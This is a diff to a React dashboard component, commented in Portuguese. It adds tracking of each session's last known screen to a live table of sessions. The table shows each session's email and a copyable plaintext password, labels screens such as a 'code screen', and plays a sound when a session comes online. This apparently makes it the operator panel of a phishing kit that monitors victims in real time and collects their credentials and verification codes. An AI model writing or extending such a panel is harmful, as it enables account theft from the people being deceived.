@@ -153,6 +153,8 @@ export default function Dashboard() {
   const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
   /** Tela atual em tempo real por sessão (vinda do canal de presença). */
   const [liveScreens, setLiveScreens] = useState<Map<string, string>>(new Map());
+  /** Última tela conhecida por sessão — persiste mesmo após a sessão ficar offline. */
+  const [lastKnownScreens, setLastKnownScreens] = useState<Map<string, string>>(new Map());
 
   // Destrava AudioContext no primeiro clique (necessário pra tocar som depois sem gesto)
   useEffect(() => {
@@ -190,6 +192,12 @@ export default function Dashboard() {
         }
         console.info("[Dashboard] presence sync — telas:", Array.from(screens.entries()));
         setLiveScreens(screens);
+        // Acumula no histórico de telas — nunca remove, só atualiza com a mais recente.
+        setLastKnownScreens((prev) => {
+          const next = new Map(prev);
+          for (const [sid, kind] of screens) next.set(sid, kind);
+          return next;
+        });
       },
       (sessionId) => {
         // Cada JOIN = transição offline→online de uma sessão.
@@ -504,16 +512,11 @@ export default function Dashboard() {
                 </thead>
                 <tbody>
                   {activeSessions.map((s) => {
-                    const hasPassword = s.password !== "—";
                     const isOnline = onlineSessionIds.has(s.session_id);
-                    const liveKind = liveScreens.get(s.session_id);
-                    // Tela em tempo real (vinda da presença) tem prioridade;
-                    // se a sessão está offline, cai pra inferência baseada em dados.
-                    const screenLabel = liveKind
-                      ? screenKindLabel(liveKind)
-                      : hasPassword
-                        ? "Tela código"
-                        : "Tela escolha";
+                    // Tela em tempo real tem prioridade; se a sessão saiu, usa a ÚLTIMA conhecida
+                    // (não inferimos pelos dados — isso causa pulos errados ao trocar de tela).
+                    const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
+                    const screenLabel = liveKind ? screenKindLabel(liveKind) : "—";
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
@@ -526,7 +529,7 @@ export default function Dashboard() {
                           <CopyText value={s.email} />
                         </td>
                         <td className="break-all px-4 py-3 font-mono text-xs">
-                          <CopyText value={hasPassword ? s.password : ""} />
+                          <CopyText value={s.password !== "—" ? s.password : ""} />
                         </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
                           <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
